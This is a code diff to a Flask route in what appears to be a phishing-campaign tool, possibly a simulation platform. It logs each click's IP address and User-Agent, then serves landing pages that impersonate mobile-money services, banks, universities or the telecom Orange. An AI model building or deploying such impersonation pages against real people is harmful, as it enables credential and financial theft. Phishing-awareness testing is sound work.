@@ -14,7 +14,19 @@ def click(token):
         abort(404)
     record_click(msg.id, request.remote_addr,
                  request.headers.get("User-Agent", ""))
-    return render_template("track/landing.html", token=token)
+    # Pick branded template by campaign scenario
+    from app.models.campaign import Campaign
+    camp = Campaign.get(msg.campaign_id)
+    scenario = camp.scenario if camp else "mobile_money"
+    template_map = {
+        "mobile_money": "track/landing_momo.html",
+        "banking":      "track/landing_bank.html",
+        "university":   "track/landing_university.html",
+    }
+    # Special: if from_name mentions Orange, use Orange template
+    if camp and camp.from_name and "orange" in camp.from_name.lower():
+        return render_template("track/landing_orange.html", token=token)
+    return render_template(template_map.get(scenario, "track/landing.html"), token=token)
 
 
 @track_bp.route("/s/<token>", methods=["POST"])
